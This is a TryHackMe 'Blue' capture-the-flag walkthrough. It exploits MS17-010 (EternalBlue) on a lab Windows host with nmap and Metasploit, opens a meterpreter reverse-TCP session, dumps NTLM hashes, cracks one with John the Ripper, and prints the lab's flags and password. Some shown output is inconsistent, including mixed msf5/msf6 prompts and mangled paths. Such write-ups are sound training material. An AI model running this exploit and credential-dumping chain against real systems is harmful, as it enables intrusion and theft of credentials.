```jsx
Machine Name: Blue
Platform: TryHackMe
Difficulty: Easy
```

> _Note: The walkthrough gives a highlevel overview of how the box was solved_

## Walkthrought:

You can find the machine [here](https://tryhackme.com/r/room/blue).

### Recon:

Lets start the things by a simple Nmap vulnerability scan. By `vuln` runs `sudo nmap -sS -sC -sV -vv --script vuln $IP` command.

```console
┌──(MnM@kali)-[~/Desktop/CTFs/THM/Blue]
└─$ vuln 10.10.166.97
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 17:23 EDT
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:23
Completed NSE at 17:23, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:23
Completed NSE at 17:23, 0.00s elapsed
Initiating Ping Scan at 17:23
Scanning blue (10.10.166.97) [4 ports]
Completed Ping Scan at 17:23, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:23
Scanning blue (10.10.166.97) [1000 ports]
Discovered open port 139/tcp on 10.10.166.97
Discovered open port 135/tcp on 10.10.166.97
Discovered open port 3389/tcp on 10.10.166.97
Discovered open port 445/tcp on 10.10.166.97
Discovered open port 49158/tcp on 10.10.166.97
Discovered open port 49154/tcp on 10.10.166.97
Discovered open port 49152/tcp on 10.10.166.97
Discovered open port 49153/tcp on 10.10.166.97
Discovered open port 49160/tcp on 10.10.166.97
Completed SYN Stealth Scan at 17:23, 0.75s elapsed (1000 total ports)
Initiating Service scan at 17:23
Scanning 9 services on blue (10.10.166.97)
Service scan Timing: About 55.56% done; ETC: 17:25 (0:00:43 remaining)
Completed Service scan at 17:24, 59.35s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.166.97.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:24
NSE Timing: About 99.82% done; ETC: 17:24 (0:00:00 remaining)
Completed NSE at 17:25, 32.95s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:25
Completed NSE at 17:25, 5.81s elapsed
Nmap scan report for blue (10.10.166.97)
Host is up, received echo-reply ttl 127 (0.041s latency).
Scanned at 2020-09-14 17:23:27 EDT for 99s
Not shown: 991 closed ports
Reason: 991 resets
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  tcpwrapped   syn-ack ttl 127
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-vuln-ms12-020:
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_sslv2-drown:
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:25
Completed NSE at 17:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:25
Completed NSE at 17:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.64 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.064KB)
```

By the scan it is evident from that the machine is vulnerabile to `ms17-010`.

```console
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

### Exploitation:

We'll use `msfconsole` for exploitation.

```console
┌──(MnM@kali)-[~/Desktop/CTFs/THM/Blue]
└─$ msfconsole 
                                                  
               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
 oMMMMMMMMMMx.                    dMMMMMMMMMMx
.WMMMMMMMMM:                       :MMMMMMMMMM,
xMMMMMMMMMo                         lMMMMMMMMMO
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
xMMMMMMMMMd                        ,0MMMMMMMMMMK;
.WMMMMMMMMMc                         'OMMMMMM0,
 lMMMMMMMMMMk.                         .kMMO'
  dMMMMMMMMMMWd'                         ..
   cWMMMMMMMMMMMNxc'.                ##########
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:                                
                                :::::::+:
                      Metasploit

       =[ metasploit v6.3.27-dev                          ]
+ -- --=[ 2335 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1382 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can pivot connections over sessions 
started with the ssh_login modules
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search eternal blue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

Load the respective module.

```console
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Wind
                                             ows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
                                             Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded S
                                             tandard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.149.130  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

View the full module info with the info, or info -d command.
```

Set the `RHOST` attribute to the machine IP Address as shown below.

```console
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.166.97
RHOSTS => 10.10.166.97
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.166.97     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

Now use the command `run` or `exploit` to execute the exploit.

```console
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.106.222:4433
[*] Post module execution completed
[*] Sending stage (176195 bytes) to 10.10.166.97
[*] Meterpreter session 2 opened (10.8.106.222:4433 -> 10.10.166.97:49303) at 2020-09-14 17:41:50 -0400
[*] Stopping exploit/multi/handler
```

### Flags:

Firstly verify your initial foothold.

```console
meterpreter > shell
Process 1888 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>
```

Use the `hashdump` command to look for password hashes.

```console
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Use `John the Ripper` or `Hash Cat` to crack the hash of `John`. You can use the following bunch of commands as well.

```console
┌──(MnM@kali)-[~/Desktop/CTFs/THM/Blue]
└─$ echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hash.txt

┌──(MnM@kali)-[~/Desktop/CTFs/THM/Blue]
└─$ john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Password was `alqfna22`. You'll find first flag in `system32`

```console
C:\Windows\system32>type C:\flag1.txt
type C:\flag1.txt
flag{access_the_machine}
```

**Flag:** `flag{access_the_machine}`

Second flag will be in `C:/Windows/System32/config`

```console
C:\Windows\system32\config>type flag2.txt
type flag2.txt
flag{sam_database_elevated_access}
```

**Flag:** `flag{sam_database_elevated_access}`

I found the third flag in the `C:\Users` directory. From there I entered `Jon` and then `documents`. In the `documents`, there was a `flag3.txt` file.

```console
C:\Windows\system32Jon\Documents> type C: flag3.txt
type flag3.txt
flag{admin_documents_can_be_valuable}
```

**Flag:** `flag{admin_documents_can_be_valuable}`

---

***Machine Done and Dusted. Sayonara*** **; )**

---
